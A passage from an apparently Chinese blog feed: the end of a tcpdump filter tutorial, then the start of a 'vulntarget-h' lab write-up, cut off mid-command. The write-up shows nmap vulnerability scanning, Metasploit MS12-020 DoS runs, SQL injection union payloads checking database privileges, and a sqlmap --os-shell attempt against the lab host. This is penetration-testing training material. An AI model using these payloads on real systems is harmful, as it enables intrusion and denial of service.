[.], ack 76, win 64240, length 0</span><br><span class="line">03:53:43.315012 IP gw.gcableconfig.local.http &gt; webb.49650: Flags [P.], <span class="built_in">seq</span> 1:2897, ack 76, win 64240, length 2896: HTTP: HTTP/1.0 200 OK</span><br><span class="line">03:53:43.321661 IP gw.gcableconfig.local.http &gt; webb.49650: Flags [FP.], <span class="built_in">seq</span> 2897:5303, ack 76, win 64240, length 2406: HTTP</span><br><span class="line">03:53:43.322855 IP gw.gcableconfig.local.http &gt; webb.49650: Flags [.], ack 77, win 64239, length 0</span><br><span class="line">5 packets captured</span><br><span class="line">5 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="or-x2F-只满足一个条件"><a href="#or-x2F-只满足一个条件" class="headerlink" title="or&#x2F;|| 只满足一个条件"></a>or&#x2F;|| 只满足一个条件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump tcp port 53 or udp port 53</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">03:54:53.621757 IP webb.56996 &gt; _gateway.domain: 36025+ A? webb-l.top. (28)</span><br><span class="line">03:54:53.623207 IP webb.47043 &gt; _gateway.domain: 12683+ AAAA? webb-l.top. (28)</span><br><span class="line">03:54:53.627082 IP webb.59208 &gt; _gateway.domain: 45958+ PTR? 2.111.168.192.in-addr.arpa. (44)</span><br><span class="line">03:54:53.680540 IP _gateway.domain &gt; webb.59208: 45958 NXDomain 0/0/0 (44)</span><br><span class="line">03:54:53.681699 IP webb.36977 &gt; _gateway.domain: 37135+ PTR? 129.111.168.192.in-addr.arpa. (46)</span><br><span class="line">03:54:53.711146 IP _gateway.domain &gt; webb.36977: 37135 NXDomain 0/0/0 (46)</span><br><span class="line">03:54:53.711433 IP _gateway.domain &gt; webb.56996: 36025 5/0/0 CNAME webb-l.github.io., A 185.199.109.153, A 185.199.111.153, A 185.199.110.153, A 185.199.108.153 (122)</span><br><span class="line">03:54:53.711433 IP _gateway.domain &gt; webb.47043: 12683 5/0/0 CNAME webb-l.github.io., AAAA 2606:50c0:8000::153, AAAA 2606:50c0:8003::153, AAAA 2606:50c0:8002::153, AAAA 2606:50c0:8001::153 (170)</span><br><span class="line">03:54:53.741361 IP webb.52080 &gt; _gateway.domain: 4388+ PTR? 153.108.199.185.in-addr.arpa. (46)</span><br><span class="line">03:54:53.789243 IP _gateway.domain &gt; webb.52080: 4388 1/0/0 PTR cdn-185-199-108-153.github.com. (90)</span><br><span class="line">10 packets captured</span><br><span class="line">10 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="not-x2F-取反"><a href="#not-x2F-取反" class="headerlink" title="not&#x2F;! 取反"></a>not&#x2F;! 取反</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump not tcp port 22</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">03:55:30.206918 IP webb &gt; cdn-185-199-108-153.github.com: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 37, length 64</span><br><span class="line">03:55:30.209607 IP webb.54773 &gt; _gateway.domain: 56005+ PTR? 153.108.199.185.in-addr.arpa. (46)</span><br><span class="line">03:55:30.230574 IP cdn-185-199-108-153.github.com &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1, <span class="built_in">seq</span> 37, length 64</span><br><span class="line">03:55:30.239947 IP _gateway.domain &gt; webb.54773: 56005 1/0/0 PTR cdn-185-199-108-153.github.com. (90)</span><br><span class="line">03:55:30.242390 IP webb.37901 &gt; _gateway.domain: 6529+ PTR? 129.111.168.192.in-addr.arpa. (46)</span><br><span class="line">03:55:30.270067 IP _gateway.domain &gt; webb.37901: 6529 NXDomain 0/0/0 (46)</span><br><span class="line">03:55:30.273460 IP webb.47470 &gt; _gateway.domain: 3405+ PTR? 2.111.168.192.in-addr.arpa. (44)</span><br><span class="line">03:55:30.299833 IP _gateway.domain &gt; webb.47470: 3405 NXDomain 0/0/0 (44)</span><br><span class="line">8 packets captured</span><br><span class="line">8 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="多个逻辑运算符组合"><a href="#多个逻辑运算符组合" class="headerlink" title="多个逻辑运算符组合"></a>多个逻辑运算符组合</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump &quot;src 192.168.1.1 and (tcp port 80 or icmp)&quot;</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">03:59:10.994485 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 4, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">03:59:14.370158 IP gw.gcableconfig.local.http &gt; webb.49676: Flags [S.], <span class="built_in">seq</span> 1740528049, ack 465635601, win 64240, options [mss 1460], length 0</span><br><span class="line">03:59:14.370455 IP gw.gcableconfig.local.http &gt; webb.49676: Flags [.], ack 76, win 64240, length 0</span><br><span class="line">03:59:14.383240 IP gw.gcableconfig.local.http &gt; webb.49676: Flags [P.], <span class="built_in">seq</span> 1:2897, ack 76, win 64240, length 2896: HTTP: HTTP/1.0 200 OK</span><br><span class="line">03:59:14.390582 IP gw.gcableconfig.local.http &gt; webb.49676: Flags [FP.], <span class="built_in">seq</span> 2897:5303, ack 76, win 64240, length 2406: HTTP</span><br><span class="line">03:59:14.391307 IP gw.gcableconfig.local.http &gt; webb.49676: Flags [.], ack 77, win 64239, length 0</span><br><span class="line">03:59:20.560951 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 5, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">03:59:21.561663 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 5, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">8 packets captured</span><br><span class="line">8 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h2 id="高级过滤"><a href="#高级过滤" class="headerlink" title="高级过滤"></a>高级过滤</h2><h3 id="less-抓取数据包小于xx-bytes的数据包"><a href="#less-抓取数据包小于xx-bytes的数据包" class="headerlink" title="less 抓取数据包小于xx bytes的数据包"></a>less 抓取数据包小于xx bytes的数据包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump less 100 -c 3 </span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">04:02:33.290867 IP 192.168.111.1.43848 &gt; webb.ssh: Flags [.], ack 3189235577, win 12881, options [nop,nop,TS val 558677448 ecr 2639240996], length 0</span><br><span class="line">04:02:33.290920 IP 192.168.111.1.43848 &gt; webb.ssh: Flags [.], ack 153, win 12881, options [nop,nop,TS val 558677448 ecr 2639240996], length 0</span><br><span class="line">04:02:33.291073 IP 192.168.111.1.43848 &gt; webb.ssh: Flags [.], ack 189, win 12881, options [nop,nop,TS val 558677449 ecr 2639240996], length 0</span><br><span class="line">3 packets captured</span><br><span class="line">12 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="greater-抓取数据包大于xx-bytes的数据包"><a href="#greater-抓取数据包大于xx-bytes的数据包" class="headerlink" title="greater 抓取数据包大于xx bytes的数据包"></a>greater 抓取数据包大于xx bytes的数据包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump greater 1000 -c 3</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">04:04:02.375412 IP gw.gcableconfig.local.http &gt; webb.49690: Flags [P.], <span class="built_in">seq</span> 2285946385:2285949281, ack 3210337588, win 64240, length 2896: HTTP: HTTP/1.0 200 OK</span><br><span class="line">04:04:02.376102 IP webb.ssh &gt; 192.168.111.1.38728: Flags [P.], <span class="built_in">seq</span> 1635248512:1635251300, ack 1337887836, win 501, options [nop,nop,TS val 2639330081 ecr 558766503], length 2788</span><br><span class="line">04:04:02.380943 IP gw.gcableconfig.local.http &gt; webb.49690: Flags [FP.], <span class="built_in">seq</span> 2896:5302, ack 1, win 64240, length 2406: HTTP</span><br><span class="line">3 packets captured</span><br><span class="line">4 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;Tcpdump 打印出网络接口上数据包内容的描述。&lt;/p&gt;
&lt;h2 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>vulntarget-h WriteUp</title>
    <link href="http://webb-l.top/2022/06/30/vulntarget-h%20write-up/"/>
    <id>http://webb-l.top/2022/06/30/vulntarget-h%20write-up/</id>
    <published>2022-06-30T07:42:55.000Z</published>
    <updated>2022-07-03T04:31:22.321Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Vulntarget漏洞靶场</p><p>项目地址：<a href="https://github.com/crow821/vulntarget">https://github.com/crow821/vulntarget</a></p></blockquote><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><ul><li><p>详细的搭建教程我这里就不演示了，可以打开下方的链接查看。</p></li><li><p><a href="https://mp.weixin.qq.com/s/AGmqroovR1EZN-QKnpSfDQ">vulntarget漏洞靶场系列（八）— vulntarget-h</a></p></li><li><p>你也可以通过项目地址的下载链接下载。</p></li><li><p>链接：<a href="https://pan.baidu.com/s/1sv9qdioNF4PTUliix5HEfg">https://pan.baidu.com/s/1sv9qdioNF4PTUliix5HEfg</a> 提取码： <strong>2dwq</strong>。</p></li></ul><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><blockquote><p><strong>提示：</strong><br>Windows Server 2008 拥有两个网卡其中网卡3是桥接。该网卡的IP存在问题这里我就把虚拟机桥接模式改成NAT然后再修改回桥接模式。</p></blockquote><h3 id="Windows-Server-2008"><a href="#Windows-Server-2008" class="headerlink" title="Windows Server 2008"></a>Windows Server 2008</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><ul><li>使用<code>nmap</code>找到Windows Server 2008的IP地址。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -sn 192.168.1.1/24</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 04:22 EDT</span><br><span class="line">...</span><br><span class="line">Nmap scan report <span class="keyword">for</span> WIN-7DSM1JVE9PO (192.168.1.99)</span><br><span class="line">Host is up (0.0035s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (6 hosts up) scanned <span class="keyword">in</span> 2.82 seconds</span><br></pre></td></tr></table></figure><ul><li>查看Windows Server 2008开放的端口并使用<code>nmap</code>扫描端口是否存在漏洞。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -sV 192.168.1.99 --script=vuln</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 04:30 EDT</span><br><span class="line">Stats: 0:06:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">Nmap scan report <span class="keyword">for</span> WIN-7DSM1JVE9PO (192.168.1.99)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 993 filtered tcp ports (no-response), 2 filtered tcp ports (host-unreach)</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">80/tcp    open  tcpwrapped</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">| rdp-vuln-ms12-020: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2012-0152</span><br><span class="line">|     Risk <span class="built_in">factor</span>: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)</span><br><span class="line">|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2012-03-13</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152</span><br><span class="line">|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span><br><span class="line">|   </span><br><span class="line">|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2012-0002</span><br><span class="line">|     Risk <span class="built_in">factor</span>: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)</span><br><span class="line">|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2012-03-13</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002</span><br><span class="line">|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span><br><span class="line">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: EOF</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 554.63 seconds</span><br></pre></td></tr></table></figure><ul><li>通过上面的返回结果我们可以发现多个漏洞，接下来我们就使用<code>msfconsole</code>的漏洞利用模块验证是否可以使用。</li></ul><blockquote><p>CVE-2007-6750 该漏洞不属于IIS服务。<br>CVE-2012-0152</p><p>CVE-2012-0002</p><ul><li>这里一共搜索到两个模块。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms12-020</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                              Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                              ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/scanner/rdp/ms12_020_check                               normal  Yes    MS12-020 Microsoft Remote Desktop Checker</span><br><span class="line">   1  auxiliary/dos/windows/rdp/ms12_020_maxchannelids  2012-03-16       normal  No     MS12-020 Microsoft Remote Desktop Use-After-Free DoS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br></pre></td></tr></table></figure><p>使用<code>auxiliary/scanner/rdp/ms12_020_check</code>模块。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; <span class="built_in">set</span> rhosts 192.168.1.99</span><br><span class="line">rhosts =&gt; 192.168.1.99</span><br><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.99:3389     - 192.168.1.99:3389 - The target is vulnerable.</span><br><span class="line">[*] 192.168.1.99:3389     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>这里显示<strong>The target is vulnerable.（目标很脆弱。）</strong>，但是我找到该漏洞的exp并不能对目标造成影响。接下来我们继续尝试另外一个模块。</p><p>使用<code>auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code>模块。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line">msf6 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; <span class="built_in">set</span> rhosts 192.168.1.99</span><br><span class="line">rhosts =&gt; 192.168.1.99</span><br><span class="line">msf6 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; exploit </span><br><span class="line">[*] Running module against 192.168.1.99</span><br><span class="line"></span><br><span class="line">[*] 192.168.1.99:3389 - 192.168.1.99:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS</span><br><span class="line">[*] 192.168.1.99:3389 - 192.168.1.99:3389 - 210 bytes sent</span><br><span class="line">[*] 192.168.1.99:3389 - 192.168.1.99:3389 - Checking RDP status...（RDP 服务无法访问）</span><br><span class="line">[-] 192.168.1.99:3389 - 192.168.1.99:3389 - RDP Service Unreachable</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>该模块也不能正常运行。接下来只能尝试其他端口。</p></blockquote><ul><li>使用<code>nikto</code>。并没有发现特别的信息。只能用浏览器打开看看能不能找到有用的数据了。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nikto -host http://192.168.1.99</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.1.99</span><br><span class="line">+ Target Hostname:    192.168.1.99</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2022-06-30 05:33:14 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Microsoft-IIS/7.5</span><br><span class="line">+ Retrieved x-aspnet-version header: 2.0.50727</span><br><span class="line">+ Retrieved x-powered-by header: ASP.NET</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ No CGI Directories found (use <span class="string">&#x27;-C all&#x27;</span> to force check all possible <span class="built_in">dirs</span>)</span><br><span class="line">+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST </span><br><span class="line">+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST </span><br><span class="line">+ 8068 requests: 0 error(s) and 7 item(s) reported on remote host</span><br><span class="line">+ End Time:           2022-06-30 05:34:13 (GMT-4) (59 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure><ul><li>使用<code>dirb</code>并没有发现有用的数据。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ dirb http://192.168.1.99</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Jun 30 06:03:46 2022</span><br><span class="line">URL_BASE: http://192.168.1.99/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.1.99/ ----</span><br><span class="line">+ http://192.168.1.99/reports (CODE:401|SIZE:0)                                                                                                            </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Thu Jun 30 06:03:49 2022</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 1</span><br></pre></td></tr></table></figure><ul><li>打开发现网站提示我们该网站存在SQL注入。</li></ul><p><img src="/../images/vulntarget-h%20write-up/%E6%88%AA%E5%9B%BE_2022-06-30_17-46-50.png" alt="截图_2022-06-30_17-46-50.png"></p><ul><li>判断该网站是否存在SQL注入。存在数字型注入。</li></ul><blockquote><p><a href="http://192.168.1.99/?user_id=1%20and%201=2">http://192.168.1.99/?user_id=1%20and%201=2</a></p></blockquote><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-06-30_05-54-25.png" alt="Screenshot_2022-06-30_05-54-25.png"></p><ul><li>获取当前用户信息。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断是否是SA权限</span></span><br><span class="line">?user_id=-1%20union%20select%200,1,2,is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>),4</span><br><span class="line"><span class="comment"># 判断是否是db_owner权限</span></span><br><span class="line">?user_id=-1%20union%20select%200,1,2,is_member(<span class="string">&#x27;db_owner&#x27;</span>),4</span><br><span class="line"><span class="comment"># 判断是否是public权限</span></span><br><span class="line">?user_id=-1%20union%20select%200,1,2,is_srvrolemember(<span class="string">&#x27;public&#x27;</span>),4</span><br></pre></td></tr></table></figure><ul><li>接下来使用<code>sqlmap</code>尝试是否能获取shell。但是无法反弹shell应该是被杀毒程序拦截。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sqlmap <span class="string">&quot;http://192.168.1.99/?user_id=1&quot;</span> --os-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                </span><br><span class="line"> ___ ___[<span 